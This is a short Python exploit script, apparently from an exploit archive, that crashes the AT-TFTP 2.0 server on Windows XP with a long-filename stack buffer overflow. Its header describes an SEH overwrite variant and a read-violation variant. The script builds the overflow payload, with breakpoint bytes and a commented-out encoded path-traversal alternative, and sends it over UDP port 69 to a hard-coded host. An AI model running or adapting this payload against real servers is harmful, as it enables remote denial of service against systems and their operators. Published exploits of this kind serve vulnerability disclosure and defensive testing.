# Exploit Title: AT-TFTP 2.0 long filename stack based buffer overflow - DOS 
# Date: 12.04.2013
# Exploit Author: xis_one@STM Solutions 
# Vendor Homepage:  http://www.alliedtelesis.com/
# Software Link: http://alliedtelesis.custhelp.com/cgi-bin/alliedtelesis.cfg/php/enduser/std_adp.php?p_faqid=1081&p_created=981539150&p_topview=1 
# Version: 2.0 
# Tested on: Windows XP SP3
#
# From 1.9 Remote Exec BOF disovered in 2006 by liuqx@nipc.org.cn  to 2.0 Remote DOS BOF 2013 - no lesson learned.
# Two variants:
#
# 1. SEH overwrite but no exception handler trigger (cookie on stack?)
# 2. Read access violation (non-exploitable?)
#
# Still we can crash the server remotely.  
#
#!/usr/bin/python
import socket
import sys
host = '192.168.1.32'
port = 69

nseh="\xCC\xCC\xCC\xCC"

#seh handler overwritten at 261 byte of shellcode but to exception triggered to use it.
 
seh="\x18\x0B\x27" # Breakpoint in no SafeSEH space in Windows XP SP3


payload="\xCC"*257 + nseh + seh + "\x00" + "3137" + "\x00"

#payload to get access violation:
#payload=("\x00\x01\x25\x32\x35\x25"
#"\x35\x63\x2e\x2e\x25\x32\x35\x25\x35\x63\x2e\x2e\x25\x32\x35\x25"
#"\x35\x63\x2e\x2e\x25\x32\x35\x25\x35\x63\x2e\x2e\x25\x32\x35\x25"
#"\x35\x63\x2e\x2e\x25\x32\x35\x25\x35\x63\x2e\x2e\x25\x32\x35\x25"
#"\x35\x63\x2e\x2e\x25\x32\x35\x25\x35\x63\x2e\x2e\x25\x32\x35\x25"
#"\x35\x63\x2e\x2e\x25\x32\x35\x25\x35\x63\x2e\x2e\x25\x32\x35\x25"
#"\x35\x63\x2e\x2e\x25\x32\x35\x25\x35\x63\x2e\x2e\x25\x32\x35\x25"
#"\x35\x63\x2e\x2e\x25\x32\x35\x25\x35\x63\x2e\x2e\x25\x32\x35\x35"
#"\x63\x65\x74\x63\x25\x32\x35\x35\x63\x68\x6f\x73\x74\x73\x00\x6e"
#"\x00")

buffer="\x00\x01"+  payload + "\x06" + "netascii" + "\x00"


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(buffer, (host, port))
